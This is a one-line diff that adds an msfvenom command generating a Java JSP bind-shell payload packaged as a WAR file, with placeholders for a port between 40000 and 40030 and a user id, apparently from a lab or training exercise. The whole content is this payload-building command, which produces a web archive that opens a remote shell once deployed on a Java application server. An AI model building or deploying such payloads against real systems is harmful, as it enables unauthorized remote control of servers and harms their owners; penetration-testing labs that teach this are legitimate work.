@@ -1,0 +1,1 @@
+msfvenom -p java/jsp_shell_bind_tcp LPORT=<port between 40000-40030> -f war > shell_<userid>.war
